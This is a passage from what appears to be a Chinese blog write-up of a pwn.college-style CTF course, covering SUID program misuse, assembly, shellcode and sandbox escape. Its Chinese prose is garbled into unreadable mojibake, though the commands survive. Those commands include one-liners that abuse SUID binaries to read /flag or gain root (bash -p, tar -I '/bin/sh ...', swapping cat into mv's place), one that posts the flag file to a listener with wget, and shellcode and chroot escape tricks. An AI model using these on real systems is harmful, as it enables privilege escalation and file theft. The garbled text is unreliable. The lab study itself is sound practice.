·éƒ½è¿‡ä¸äº†çš„ï¼Œæ¯•ç«Ÿåˆè¦è¯»åˆè¦å†™å¿…é¡»æ˜¯åŒå‘æ‰è¡Œã€‚</p><p>level128ï¼šéœ€è¦è¾“å…¥500ä¸ªsignalï¼Œè‚¯å®šè¦ç”¨è„šæœ¬ï¼Œè¿™é‡Œæœ‰ä¸ªé—®é¢˜å°±æ˜¯ä¸€å¼€å§‹æˆ‘æ˜¯ä¸€ä¸ªä¸€ä¸ªä¿¡å·çš„recvï¼Œç„¶è€Œæœ€åè¿›ç¨‹å´©æ‰äº†ï¼Œæˆ‘æƒ³ä¼°è®¡æ˜¯ç¼“å†²åŒºçš„å†…å®¹å¤ªå¤šäº†ï¼Œæ‰€ä»¥ç°åœ¨éƒ½æ˜¯ä¸€å£æ°”æ¥æ”¶æ‰€æœ‰çš„signalï¼Œç„¶åå‘é€ä¸€ä¸ªrecvä¸€ä¸‹ï¼Œè¿™æ ·ä¿è¯ç¼“å†²åŒºä¸ä¼šå¤šåˆ°å´©æ‰è¿›ç¨‹ã€‚</p><p>level142ï¼šè¦æ‰‹å†™Cè¯­è¨€çš„ç½‘ç»œé€šä¿¡ï¼Œå…¶ä¸­çš„<code>write</code>åˆšå¼€å§‹sbäº†ï¼Œé•¿åº¦å‚æ•°ç”¨çš„<code>sizeof(buf)</code>ï¼Œè¿™ä¸ªç›´æ¥å¯¼è‡´å†™å…¥äº†ä¸€äº›éæ³•å­—ç¬¦ï¼Œåº”è¯¥æ˜¯<code>strlen(buf)</code>æ‰å¯¹ã€‚</p><p>æ”¶è·æœ€å¤§çš„å°±æ˜¯ä¸‡ç‰©çš†å¯æ‹¿pwntoolsåšè¿›ç¨‹çš„IOæ§åˆ¶ï¼Œæ˜¯çœŸçš„æ–¹ä¾¿ï¼Œè™½ç„¶é¢˜ç›®è¦æ±‚è¦ç”¨Cè¯­è¨€ä¹‹ç±»çš„ï¼Œä½†ä½ å¯ä»¥åœ¨å¯åŠ¨é¢˜ç›®ä¸Šç”¨Cè¯­è¨€ç¨‹åºå¯åŠ¨ï¼Œç„¶åæ‹¿pwntoolsæ§åˆ¶è¿™ä¸ªCè¯­è¨€ç¨‹åºçš„IOï¼Œä¸åŸæ¥ç›¸æ¯”ä¸­é—´å¤šåµŒå¥—ä¸€å±‚ç¨‹åºå¯åŠ¨ã€‚</p><h2 id="module2-ç¨‹åºè¯¯ç”¨æ¨¡å—"><a href="#module2-ç¨‹åºè¯¯ç”¨æ¨¡å—" class="headerlink" title="module2 ç¨‹åºè¯¯ç”¨æ¨¡å—"></a>module2 ç¨‹åºè¯¯ç”¨æ¨¡å—</h2><p>å¯»æ‰¾å…·æœ‰SUIDæƒé™çš„ç¨‹åº</p><ul><li><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></li><li><code>find / -perm -u=s -type f 2&gt;/dev/null</code></li><li><code>find / -user root -perm -4000-exec ls -ldb {} ;</code></li></ul><p>å¯¹äºä¸€äº›åšæ•°æ®æ“ä½œçš„å‘½ä»¤ï¼Œå¯ä»¥å…ˆå¯¹flagæ–‡ä»¶åšæ“ä½œï¼Œä¹‹åå†è¿›è¡Œé€†æ“ä½œæŸ¥çœ‹åŸå§‹æ•°æ®è·å¾—flagã€‚æ¯”å¦‚ï¼š<code>bzip2 -c /flag | bzip2 -d</code>ã€‚</p><p>å¯¹äº<code>zip</code>å’Œ<code>unzip</code>å‹ç¼©å’Œè§£å‹æ˜¯åˆ†å¼€çš„ç¨‹åºï¼Œé¦–å…ˆç”¨zipå‹ç¼©flagæ–‡ä»¶ï¼Œç„¶åunzipè§£å‹æ–‡ä»¶å¹¶è¾“å‡ºå†…å®¹ã€‚</p><p><code>tar -cvf h618.tar /flag;tar xf h618.tar -O</code>ï¼Œè¿™è¿˜æ˜¯å»¶ç»­å‹ç¼©+è§£å‹çš„æ€è·¯ã€‚åœ¨ç½‘ä¸Šçœ‹åˆ°å¦å¤–ä¸€ä¸ªåˆ©ç”¨<code>-I</code>æ‰§è¡Œé¢å¤–ç¨‹åºçš„æ–¹æ³•è·å¾—flagã€‚<code>tar xf /flag -I &#39;/bin/sh -c &quot;cat 1&gt;&amp;2&quot;&#39;</code>ã€‚</p><p><code>ar -q h618.ar /flag;cat h618.ar</code>ã€‚èƒ½å¤Ÿç›´æ¥ä»é‡Œé¢è¯»å–åŸå§‹æ•°æ®ï¼Œçœ‹èµ·æ¥aræ›´åƒæ˜¯ä¸€ä¸ªæ•´åˆæ•°æ®çš„ç¨‹åºï¼Œæ²¡æœ‰å¯¹å†…å®¹åšå‹ç¼©å¤„ç†ã€‚</p><p><code>echo &quot;/flag&quot; | cpio -o</code>ï¼Œcpioå‘½ä»¤å¿…é¡»ä»ç®¡é“æŠŠéœ€è¦æ‰“åŒ…æ–‡ä»¶çš„å­—ç¬¦ä¸²ä¼ é€’è¿›å»ã€‚</p><p><code>genisoimage -sort /flag</code>è¿™ä¸ªç¥å¥‡çš„åœ°æ–¹åœ¨äºï¼Œè™½ç„¶å› ä¸ºæ ¼å¼é—®é¢˜è€ŒæŠ¥é”™äº†ï¼Œä½†æ˜¯å´æŠŠflagçš„å†…å®¹è¾“å‡ºå‡ºæ¥ã€‚</p><p><code>find /flag -exec cat {} \;</code>ï¼Œfindå¯»æ‰¾åˆ°æ–‡ä»¶ä¹‹åå¯ä»¥æ‰§è¡Œä¸€äº›æ“ä½œã€‚</p><p><code>setarch x86_64 cat /flag</code></p><p><a href="https://www.hi-linux.com/posts/61543.html" target="_blank" rel="noopener">https://www.hi-linux.com/posts/61543.html</a> socatå…¥é—¨æ•™ç¨‹ æŒºå¥½çš„ï¼Œ<code>socat - /flag</code>èƒ½ç›´æ¥è¯»æ–‡ä»¶å†…å®¹ã€‚</p><p><code>whiptail --textbox /flag 10 60</code>ï¼Œä¸€ä¸ªshellçª—å£ç¨‹åºã€‚</p><p>awk sedè¿™ç§ä¸“é—¨å¤„ç†è¾“å…¥è¾“å‡ºçš„ç¨‹åºç›´æ¥éšä¾¿å†™</p><p>edç¼–è¾‘å™¨ ç›´æ¥<code>ed /flag</code> ç„¶åè¾“å…¥pï¼Œæ‰“å°æ•°æ®</p><p>level37ç›´æ¥ç»™äº†chownçš„æƒé™ï¼Œé‚£æ— æ•Œäº†ï¼Œç›´æ¥æ”¹æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·åå¯ä»¥éšä¾¿è¯»å†™ã€‚</p><p><code>cp /flag /dev/stdout</code>ï¼Œè¿™ä¸ªå¾ˆç»ï¼åˆ©ç”¨linuxé‡Œé¢çš„è¾“å‡ºè®¾å¤‡æ–‡ä»¶æ‰“å°æ•°æ®ã€‚</p><p><code>mv /usr/bin/cat /usr/bin/mv;æ‰§è¡Œç¨‹åº;mv /flag</code>ï¼ŒmvåŒæ ·ä¹Ÿæ˜¯å¾ˆéªšçš„æ“ä½œï¼Œå› ä¸ºè¿™ä¸ªæŒ‡ä»¤æœ¬èº«ä¸èƒ½è¾“å‡ºæ‰€ä»¥å¿…é¡»è¦æƒ³åŠæ³•æ“ä½œåˆ«çš„æ–‡ä»¶ï¼Œå…ˆæŠŠcatæ‹·è´åˆ°mvçš„ä½ç½®ä¸Šï¼Œå†ç»™å‡çš„mvä¸Šç‰¹æƒä½ï¼Œæœ€åè¯»å–flagã€‚</p><p><code>perl -ne print /flag</code>ï¼Œå‚è€ƒç¥ä»™ç½‘ç«™<a href="https://gtfobins.github.io/gtfobins/perl/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/perl/</a></p><p><code>python -c &#39;print(open(&quot;/flag&quot;).read())&#39;</code></p><p>æ²¡æƒ³åˆ°rubyç›´æ¥ç”¨å‘½ä»¤è¡Œä¼šæœ‰å®‰å…¨è­¦å‘Šï¼Œåªèƒ½å†™è„šæœ¬æ‰§è¡Œæ–‡ä»¶è¯»å–ã€‚</p><p><code>bash -p</code>ï¼Œè·å¾—rootæƒé™</p><p><code>date -f /flag</code>ï¼Œç›´æ¥æŠ¥é”™è¾“å‡ºæ–‡ä»¶ä¸­çš„å†…å®¹</p><p><code>gcc -E -x c /flag</code>ï¼Œè¿™é‡Œgccå¿…é¡»è¦æŒ‡å®šè¯­è¨€æ‰èƒ½é¢„ç¼–è¯‘ã€‚</p><p><code>wget --post-file=/flag http://127.0.0.1:8088</code>ã€‚æœ‰ç‚¹å‘ï¼Œä½¿ç”¨wgetçš„-Iå‚æ•°è¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹æ—¶ï¼ŒæŠ¥é”™è¾“å‡ºä¼šå¼ºåˆ¶è½¬æ¢æˆå°å†™å­—æ¯ã€‚</p><p><code>ssh-keygen</code>èƒ½ç”¨-Då‚æ•°åŠ è½½åŠ¨æ€åº“æ‰§è¡Œä»£ç ã€‚ç›´æ¥å†™ä¸€ä¸ªORWçš„åŠ¨æ€åº“å»è¯»flagã€‚</p><h3 id="module2-å°æ€»ç»“"><a href="#module2-å°æ€»ç»“" class="headerlink" title="module2 å°æ€»ç»“"></a>module2 å°æ€»ç»“</h3><p>æ€è·¯ä¸€ï¼šåˆ©ç”¨ç¨‹åºè‡ªèº«çš„è¾“å‡ºåŠŸèƒ½<br>æ€è·¯äºŒï¼šåˆ©ç”¨ç¨‹åºå¯ä»¥æ‰§è¡Œå¤–éƒ¨å‘½ä»¤çš„åŠŸèƒ½<br>æ€è·¯ä¸‰ï¼šåˆ©ç”¨ç¨‹åºä¼ªé€ æŸä¸ªè·¯å¾„ä¸­çš„æ–‡ä»¶ï¼Œç„¶åè¯¥æ–‡ä»¶èƒ½å¤Ÿä»¥rootæƒé™æ‰§è¡Œ<br>æ€è·¯å››ï¼šåˆ©ç”¨ç¨‹åºè¯»æ–‡ä»¶æŠ¥é”™è¾“å‡ºä¿¡æ¯<br>æ€è·¯äº”ï¼šåˆ©ç”¨ç¨‹åºæ‰§è¡Œè„šæœ¬çš„åŠŸèƒ½ç¼–å†™è¯»æ–‡ä»¶æ“ä½œ</p><h2 id="module3-æ±‡ç¼–æ¨¡å—"><a href="#module3-æ±‡ç¼–æ¨¡å—" class="headerlink" title="module3 æ±‡ç¼–æ¨¡å—"></a>module3 æ±‡ç¼–æ¨¡å—</h2><p>æ³¨æ„è¿™ç³»åˆ—çš„é¢˜å¿…é¡»ä»¥sendçš„æ–¹å¼è¾“å…¥ï¼Œå¦‚æœæœ«å°¾å­˜åœ¨<code>\x0a</code>ï¼Œä¼šç»§ç»­è¯»ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œç»“æœåˆæ— æ³•è¯»ï¼Œå¯¼è‡´é”™è¯¯ã€‚è™½ç„¶æˆ‘ä¸€å¼€å§‹ä½¿ç”¨æ»‘æ¿æŒ‡ä»¤å¡«å……ç»•è¿‡äº†ï¼Œä½†è¿™ç§æ“ä½œè¿˜æ˜¯æœ‰ç‚¹è ¢ã€‚ã€‚</p><p><code>python /challenge/debug.py x</code>ï¼Œxä¸ºlevelçš„æ•°å­—ï¼Œè¿™æ ·å¯ä»¥è°ƒè¯•ä¸åŒlevelçš„ç¨‹åºï¼Œèƒ½å¤Ÿæ¸…æ™°çš„çœ‹åˆ°æ±‡ç¼–æ‰§è¡Œä¹‹åå¯„å­˜å™¨çš„ç»“æœå’Œæ ˆçš„å˜åŒ–ï¼Œåšçš„å¾ˆniceï¼</p><p>gccçš„æ±‡ç¼–å™¨ä½¿ç”¨<code>gcc -nostdlib -static exit.s -o exit</code>ã€‚objdumpè¾“å‡ºæ–‡ä»¶çš„æ±‡ç¼–ã€‚<code>objdump -M intel -d exit.elf</code></p><p>level5ï¼šæœ‰ç‚¹æç¬‘çš„åœ°æ–¹ï¼Œè¿™é“é¢˜è€ƒç‚¹æ˜¯å–ä½™ï¼Œæˆ‘ç›´æ¥éšæœºåˆ°ä¸€ä¸ª<code>mod1</code>ï¼Œä»€ä¹ˆéƒ½ä¸ç”¨è¾“ç›´æ¥æ‹¿åˆ°flagï¼Œè¿™æ³¢å•Šï¼Œè¿™æ³¢æ˜¯å¼ºè¿æ‹¿flagã€‚</p><p>level17ï¼šè¿™é‡Œçš„<code>jmp 0x51</code>ä¸­çš„æ•°å­—æ˜¯é—´æ¥è·³è½¬çš„åç§»è€Œä¸æ˜¯ç›¸å¯¹å½“å‰åœ°å€çš„åç§»ã€‚è¿˜æœ‰å°±æ˜¯pwntoolsçš„æ±‡ç¼–å‡½æ•°æ— æ³•ç›´æ¥å¯¹è¿™æ¡è¯­å¥åšæ±‡ç¼–è½¬äºŒè¿›åˆ¶ï¼Œå› æ­¤æˆ‘æ˜¯ç›´æ¥ç”¨çš„<code>\xeb\x51</code>ã€‚<code>\xeb</code>æ˜¯ç›¸å¯¹è·³è½¬çš„opæ“ä½œç ã€‚</p><p>level19ï¼šå†™è·³è½¬è¡¨çš„é¢˜ç›®</p><p>level20ï¼šé¢˜ç›®æè¿°æœ‰é—®é¢˜ã€‚ã€‚ã€‚è¯´è¦4å­—çš„æ•°æ®ï¼Œå…¶å®åªæœ‰2å­—æ•°æ®ç›¸åŠ ã€‚ã€‚æ‰€ä»¥æ¯æ¬¡é—´éš”4å­—èŠ‚ï¼Œç´¯åŠ åˆ°raxä¸­å†é™¤å°±okäº†ã€‚å¾ªç¯æ˜¯éœ€è¦æœ‰ä¸¤ä¸ªjmpæŒ‡ä»¤æ¥æ§åˆ¶çš„ï¼Œä¸€ä¸ªjmpæ§åˆ¶æ¡ä»¶ï¼Œä¸€ä¸ªjmpæ§åˆ¶å¾ªç¯ä½“ç»“æŸä¹‹åè¿”å›åˆ°æ¡ä»¶åˆ¤æ–­å¤„ã€‚</p><p>level21ï¼šè°ƒäº†å¿«ä¸€ä¸ªå°æ—¶ç»ˆäºè¿‡äº†ã€‚ç»†èŠ‚ç‚¹ï¼šåœ¨è°ƒç”¨å‡½æ•°çš„æ—¶å€™x64å‡½æ•°è§„çº¦æ˜¯è¦ä»rdiä¼ å‚æ•°ï¼Œæ‰€ä»¥éœ€è¦ä¿å­˜æ•°æ®åˆ°æ ˆä¸Šï¼Œè°ƒç”¨ä¹‹åå†æ¢å¤ã€‚åŒæ ·çš„åŸå› ï¼Œraxæ˜¯è¿”å›å€¼çš„ç›®æ ‡å¯„å­˜å™¨ï¼Œå› æ­¤ä¹Ÿéœ€è¦ä¿å­˜åˆ°æ ˆä¸Šã€‚ç¬¬äºŒä¸ªç»†èŠ‚ç‚¹åœ¨äºcmpï¼Œcmpæ˜¯ç¬¬ä¸€ä¸ªå‚æ•°å‡å»ç¬¬äºŒä¸ªå‚æ•°äº§ç”Ÿçš„ç»“æœæ¥è®¾ç½®æ ‡è®°ä½ï¼Œä¸€å®šè¦è®°ä½æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°å‡ç¬¬äºŒä¸ªå‚æ•°ã€‚ç¬¬ä¸‰ä¸ªç»†èŠ‚ç‚¹ï¼Œå†™çš„æ˜¯ä¸€ä¸ªå‡½æ•°æ‰€ä»¥æœ«å°¾ä¸€å®šè¦æœ‰retæŒ‡ä»¤ã€‚ç¬¬å››ä¸ªç»†èŠ‚ç‚¹ï¼Œå®ƒè¯´æ˜çš„é€»è¾‘å¿…é¡»å…¨éƒ¨å®ç°ï¼Œå®ƒä¼šæœ‰å¤šå¥—æ•°æ®å»æ£€æµ‹é€»è¾‘ã€‚</p><p>level23ï¼šåˆæ˜¯è°ƒäº†å¥½ä¹…ã€‚ã€‚ã€‚æœ€å¥½ç”¨ä¸Šr8ï¼Œr9è¿™äº›å¯„å­˜å™¨ï¼Œè¿™æ ·èƒ½æ–¹ä¾¿å¾ˆå¤šï¼Œä¸ç”¨é€šè¿‡æ ˆå»ä¿å­˜å¯„å­˜å™¨çš„å€¼ã€‚æœ€åå› ä¸ºä¸€ä¸ªåˆ¤æ–­æ¡ä»¶å¡äº†å¾ˆä¹…ï¼Œå®ƒæœ‰ä¸€ç»„æ•°æ®æ˜¯æœ‰æ•°é‡ç›¸åŒçš„æƒ…å†µï¼Œè¿™æ—¶åº”è¯¥æ˜¯ä¿ç•™å‰é¢è¾ƒå°çš„å€¼ï¼Œæœ‰ä¸€ä¸ªæŠ€å·§æ˜¯cmpçš„æ¡ä»¶å¯ä»¥æ ¹æ®æ¯”è¾ƒçš„æ•°æ®çš„ä½ç½®ç›´æ¥ä¸€ä¸€å¯¹åº”ï¼Œå¦‚æœæ˜¯ç›¸åçš„ä½ç½®å¯ä»¥å¯¹æ¯”è¾ƒç¬¦å·ç›´æ¥å–åã€‚</p><h2 id="module4-shellcodeæ¨¡å—"><a href="#module4-shellcodeæ¨¡å—" class="headerlink" title="module4 shellcodeæ¨¡å—"></a>module4 shellcodeæ¨¡å—</h2><p>è°ƒè¯•shellcodeçš„æ–¹æ³•æœ‰2ä¸ªï¼š</p><ol><li>ç›´æ¥ç”¨æ±‡ç¼–å†™æˆ<code>.s</code>çš„æ±‡ç¼–æ–‡ä»¶ï¼Œç”¨gccç¼–è¯‘ä¹‹åæ‹¿gdbè°ƒè¯•æˆ–è€…straceè¿½è¸ª</li><li>å†™ä¸€ä¸ªshellcodeçš„loaderç¨‹åºï¼Œè¾“å…¥shellcodeçš„rawæ•°æ®è¿›å»åç›´æ¥è°ƒç”¨æ‰§è¡Œ</li></ol><p>è°ƒè¯•shellcodeæŠ€å·§ä¸æ³¨æ„äº‹é¡¹ï¼š</p><ol><li>å¯ä»¥è‡ªå·±åŠ ç¡¬ç¼–ç æ–­ç‚¹int3</li><li>å¼‚æ¶æ„çš„shellcodeå¯ä½¿ç”¨qemuæ‰§è¡Œï¼Œ-straceèƒ½è¿½è¸ªï¼Œ-gå¯ä»¥è°ƒè¯•</li><li>æŸäº›libcå‡½æ•°ä¼šåç‰¹æ®Šå­—ç¬¦ï¼Œæ¯”å¦‚ç©ºæ ¼ï¼Œæ¢è¡Œï¼Œç©ºå­—ç¬¦ã€‚</li><li>æ³¨æ„å½“æŸæ¡æŒ‡ä»¤å‡ºç°badå­—ç¬¦æ—¶å¯ä»¥ç­‰æ•ˆæ›¿æ¢æˆå…¶ä»–æŒ‡ä»¤æ¥é¿å…</li><li>å½“æ¡ä»¶é™åˆ¶è¿‡å¤šçš„æ—¶å€™å¯ä»¥åˆ†é˜¶æ®µæ³¨å…¥shellcodeï¼Œå…ˆå†™ä¸€ä¸ªå°shellcodeï¼Œé€šè¿‡å°shellcodeå†™å…¥æ›´å¤šshellcodeå¹¶æ‰§è¡Œ</li><li>å¦‚æœä½ çš„shellcodeä¼šå› ä¸ºä¸å¯æŠ—åŠ›è¢«ä¿®æ”¹ï¼Œå¯ä»¥åå¤è°ƒè¯•è·³è¿‡è¿™éƒ¨åˆ†ï¼Œæˆ–è€…åˆ©ç”¨è¿™ç§ä¿®æ”¹å»æ„é€ shellcode</li><li>å¯ä»¥ä½¿ç”¨mprotectç³»ç»Ÿè°ƒç”¨å»ä¿®æ”¹å†…å­˜é¡µçš„è¯»å†™æ‰§è¡Œæƒé™ï¼Œè¾¾åˆ°æ‰§è¡Œshellcodeçš„ç›®çš„</li><li>JITåŠŸèƒ½é€šå¸¸ä¸ºäº†é€Ÿåº¦ä¼šä¿ç•™å¯å†™+å¯æ‰§è¡Œçš„å†…å­˜é¡µï¼Œè¿™å¤©ç„¶é€‚åˆshellcodeçš„æ‰§è¡Œ</li><li>åˆ©ç”¨nop<code>\x90</code>æ»‘æ¿æŒ‡ä»¤æ¥è§£å†³åœ°å€éšæœºçš„é—®é¢˜ï¼Œè¿™æ ·æˆ‘ä»¬è·³åˆ°ä¸€ä¸ªè¾ƒä½åœ°å€åèƒ½ç›´æ¥æ»‘åˆ°æœ€ç»ˆçš„shellcode</li></ol><p>level1-3ï¼šlevel1æ˜¯orwçš„shellcodeå»è¯»flagï¼Œé‡åœ¨ä¸€ä¸ªç»å…¸ã€‚åˆšå¼€å§‹ä¸€ç›´ä»¥ä¸ºæ˜¯è¦è¿”å›ä¸€ä¸ªshellï¼Œæäº†åŠå¤©ç»“æœå‘ç°æƒé™ä¸å¤Ÿï¼ŒæŠ˜è…¾ä¹‹åçŸ¥é“äº†å¿…é¡»æ˜¯<code>bash -p /bin/sh</code>ã€‚level2æ˜¯æ»‘æ¿æŒ‡ä»¤çš„è¿ç”¨ã€‚level3æ˜¯banäº†0x00ã€‚</p><p>level4ï¼šbanäº†0x48ã€‚è¿™ä¸ªç¨å¾®éº»çƒ¦ä¸€ç‚¹ï¼Œå› ä¸ºæ“ä½œraxã€rbxç­‰é€šç”¨å¯„å­˜å™¨æ—¶ä¼šäº§ç”Ÿ0x48ï¼Œä½†åœ¨æµ‹è¯•çš„æ—¶å€™å‘ç°è¿™ä¸ªå¯¹r8ã€r9ç­‰å¯„å­˜å™¨æ²¡æœ‰é™åˆ¶ï¼Œè€Œè¿™äº›å¯„å­˜å™¨çš„æ“ä½œä¸ä¼šäº§ç”Ÿ0x48ã€‚</p><p>level5-6ï¼šlevel5å¡äº†æœ‰ç‚¹ä¹…ï¼Œæ—¢ç„¶æ— æ³•ç”¨å®æ—¶å»æ”¹æŒ‡ä»¤çš„æ–¹æ³•ï¼Œé‚£ä¹ˆé‡‡ç”¨åœ¨æ ˆä¸Šæ”¹æ•°æ®ç„¶åè·³è¿‡å»çš„æ–¹æ³•ã€‚è¿™é“é¢˜ç®€ç›´æ˜¯ç©¶ææŠ˜ç£¨ã€‚level6ç›´æ¥åœ¨å‰é¢æ’å…¥0x1000çš„nopå³å¯ã€‚</p><p>level7ï¼šæŠŠè¾“å…¥è¾“å‡ºå…¨å…³äº†ï¼Œå°è¯•å†™æ–‡ä»¶æ¥è·å¾—ç»“æœã€‚ç»“æœæˆ‘è‡ªå·±æµ‹è¯•çš„shellcodeæ˜¯å®Œå…¨æ²¡æœ‰é—®é¢˜ï¼Œä½†ä¸çŸ¥é“ä¸ºå•¥åœ¨å®é™…è¿è¡Œçš„æ—¶å€™å°±æ˜¯æœ‰é—®é¢˜ã€‚ã€‚ç™¾æ€ä¸å¾—å…¶è§£ã€‚æœ€åæœç´¢ä¸€ç•ªï¼Œå‘ç°æœ‰chmodå¤§æ³•ï¼Œç›´æ¥æ”¹flagçš„æƒé™ï¼Œæ„Ÿè§‰è¿™ä¸ªæ–¹æ³•æ˜¯èƒ½å¤Ÿé€šæ€çš„ã€‚</p><p>level8ï¼šé¢˜ç›®è¦æ±‚shellcodeåªèƒ½æœ‰0x12å­—èŠ‚ï¼Œè‚¯å®šä¸èƒ½æ˜¯å®Œæ•´çš„shellcodeï¼Œåº”è¯¥æ˜¯è¦ä¸¤æ®µæ‰èƒ½å®Œæˆã€‚ä½†å‘ç°æ€ä¹ˆå¼„éƒ½ä¸è¡Œã€‚ã€‚ã€‚æœ€åè¿˜æ˜¯ç”¨chmodåšçš„ï¼Œä¸è¿‡è¦å¯¹shellcodeåšä¸€å®šç¨‹åº¦ä¸Šçš„ç¼©å‡ã€‚æœ€åç”¨å›ºå®šçš„åœ°å€å»è·å–flagå­—ç¬¦ä¸²çš„ä½ç½®ï¼Œæ²¡æƒ³åˆ°æˆåŠŸäº†ï¼Œè¿™é‡Œflagæœ«å°¾çš„<code>\x00</code>å¯ä»¥ä¸ç”¨ä¼ è¾“è¿‡å»ï¼Œé»˜è®¤ç©ºé—´ä¸­éƒ½æ˜¯0ã€‚æœ€ç»ˆæ‰§è¡Œ<code>chmod(&quot;/flag&quot;, 4)</code>ï¼Œæ”¹æˆæˆ‘ä»¬å¯è¯»çš„æ–‡ä»¶æƒé™å³å¯ã€‚</p><p>level9ï¼šé¢˜ç›®åœ¨æ¯10å­—èŠ‚åæ’å…¥10å­—èŠ‚çš„0xccï¼Œç›´æ¥æ‹¿ä¸Šé¢çš„shellcodeé­”æ”¹ä¸€ä¸‹ï¼Œä¸­é—´é—´éš”çš„10å­—èŠ‚ç”¨nopå¡«å……ã€‚</p><p>level10-12ï¼šlevel10ä¼šå¯¹æ¯8å­—èŠ‚ç”¨å†’æ³¡æ’åºå¤„ç†ã€‚æœ‰ç‚¹å¥‡æ€ªã€‚ã€‚ã€‚æ„Ÿè§‰æ²¡ä»€ä¹ˆç”¨ç›´æ¥æ‹¿level8çš„å°±è¿‡äº†ã€‚level11å…³é—­stdinï¼Œæ„å‘³ç€ä¸èƒ½è¿›è¡ŒäºŒæ®µshellcodeæ³¨å…¥ï¼Œç„¶è€Œæˆ‘ç›´æ¥ä¸€æ®µå°±å¥½äº†ğŸ¤£ã€‚level12è¦æ±‚shellcodeå­—ç¬¦å¿…é¡»ç‹¬ç«‹ï¼Œè¿˜æ˜¯ç”¨çš„å‰é¢çš„shellcodeç›´æ¥é€šæ€ã€‚</p><p>level13ï¼šé¢˜ç›®è¦æ±‚12å­—èŠ‚çš„shellcodeã€‚ã€‚ã€‚æˆ‘çš„å¤©ï¼Œæ„å‘³ç€åŸæ¥çš„åˆ©ç”¨chmodçš„æ€è·¯ä¸è¡Œäº†ã€‚è¿™é‡Œéœ€è¦ç»“åˆè½¯è¿æ¥æ¥åšï¼Œå…ˆæŠŠ/flagè½¯è¿æ¥åˆ°æœ¬åœ°ç”Ÿæˆä¸€ä¸ªå­—ç¬¦åçš„æ–‡ä»¶ï¼Œå†å¯¹è¿™ä¸ªæ–‡ä»¶ä½¿ç”¨chmodï¼Œæ²¡æƒ³åˆ°å¯¹è½¯è¿æ¥æ–‡ä»¶åšchmodä¼šç›´æ¥å½±å“åˆ°æœ¬ä½“æ–‡ä»¶ã€‚</p><p>level14ï¼šé¢˜ç›®è¦æ±‚åªç”¨6å­—èŠ‚çš„shellcodeã€‚è¿™ä¸ªæ—¶å€™å°±å¿…é¡»è¦ç»“åˆshellcodeæ‰§è¡Œæ—¶çš„å…·ä½“ç¯å¢ƒäº†ï¼Œåœ¨æ‰§è¡Œæ—¶rdx=mmapçš„åœ°å€å¹¶ä¸”rax=0ï¼Œè¿™æ ·æ˜¯å¯ä»¥ç›´æ¥ç”¨rdxæ¥ä»£æ›¿åŸºåœ°å€ï¼Œä¸”èƒ½ç›´æ¥è°ƒç”¨readå†æ¬¡è¯»å…¥shellcodeã€‚</p><p>åœ¨ç ”ç©¶çš„æ—¶å€™å‘ç°ä¸€ä¸ªç¥å¥‡çš„æŒ‡ä»¤<code>cdq</code>ï¼Œå¯ä»¥ä½¿å¾—rdx=0ï¼Œä»¥åå¯ä»¥åœ¨å†™shellcodeçš„æ—¶å€™ç”¨åˆ°ã€‚</p><h2 id="module5-æ²™ç®±é€ƒé€¸æ¨¡å—"><a href="#module5-æ²™ç®±é€ƒé€¸æ¨¡å—" class="headerlink" title="module5 æ²™ç®±é€ƒé€¸æ¨¡å—"></a>module5 æ²™ç®±é€ƒé€¸æ¨¡å—</h2><p>level1-2ï¼šlevel1ç›´æ¥è·¯å¾„ç©¿è¶Šæ‹¿åˆ°flagã€‚level2è¦å†™shellcodeï¼Œä½¿ç”¨shellcodeçš„<code>chroot(&quot;../../&quot;)</code>å®ç°æ ¹ç›®å½•è½¬ç§»çªç ´æ²™ç®±ï¼Œå†è¯»flagã€‚</p><p>level3ï¼šé€šè¿‡<code>..</code>è·³å‡ºç›®å½•çš„æ–¹æ³•ä¼¼ä¹ä¸è¡Œäº†ï¼Œä¼°è®¡æ˜¯æŠŠ<code>..</code>ç¦æ­¢äº†ã€‚ç„¶åæƒ³åˆ°åˆ©ç”¨è½¯è¿æ¥ï¼Œåœ¨ç¬¬ä¸€æ¬¡æ–‡ä»¶æ‰“å¼€æ—¶å¼€å¯æ­£ç¡®çš„flagï¼Œç»“æœä¹Ÿä¸è¡Œã€‚ã€‚ã€‚æœ€åçš„æ€è·¯æ˜¯åˆ›å»ºä¸€ä¸ªå­ç›®å½•ï¼Œç„¶åchrootè¿›å»å°±èƒ½æŠŠä¹‹å‰çš„chrootåˆ·æ–°æ‰ï¼Œå› ä¸ºlinuxå†…æ ¸åªç»´æŠ¤ä¸€ä¸ªchrootï¼Œæ‰€ä»¥ä¹‹åå†åˆ©ç”¨è€åŠæ³•è¯»flagå³å¯ã€‚</p><p>level4-7ï¼šé€šè¿‡è¿™é“é¢˜åˆå­¦åˆ°æ–°çš„æ“ä½œäº†ï¼Œè¿™é‡Œçš„shellcodeåªèƒ½ä½¿ç”¨openatã€writeã€readã€sendfileï¼Œæ—¢ç„¶å‡ºç°äº†openatï¼Œå»æŸ¥äº†è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½å‘ç°é…åˆä¹‹å‰çš„ç¨‹åºå¯åŠ¨æ—¶çš„openå¯ä»¥å¯¹æ²™ç®±å¤–çš„æ–‡ä»¶åšè¯»æ“ä½œã€‚<code>/challenge/babyjail_level4 /</code>ï¼Œæ‰“å¼€æ ¹ç›®å½•ä¹‹åç›´æ¥ç”¨openatæ¥æ‰“å¼€flagã€‚level5ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œä¸è¿‡æœ‰äº†linkatï¼Œå¿…é¡»è¦æŠŠflagè¿æ¥åˆ°tmpçš„æ²™ç®±ä¸­ã€‚level6å’Œlevel7çš„æ€è·¯å’Œä¸Šé¢å¾ˆé›·åŒã€‚</p><p>level8ï¼šè¿™é“é¢˜æ¯”è¾ƒæœ‰æ„æ€ï¼Œå®ƒæ²¡æœ‰é¢å¤–æ‰“å¼€æ²™ç®±ä¹‹å¤–çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé‚£ä¹ˆè¯¥æ€ä¹ˆç»•è¿‡å‘¢ã€‚ç¿»äº†ç¾¤é‡Œé¢çš„æ¶ˆæ¯ä¹‹åå‘ç°ï¼Œå¯ä»¥åˆ©ç”¨çˆ¶è¿›ç¨‹æ‰“å¼€fdï¼Œç„¶åforkå‡ºå­è¿›ç¨‹å»æ‰§è¡Œç¨‹åºã€‚æ„é€ 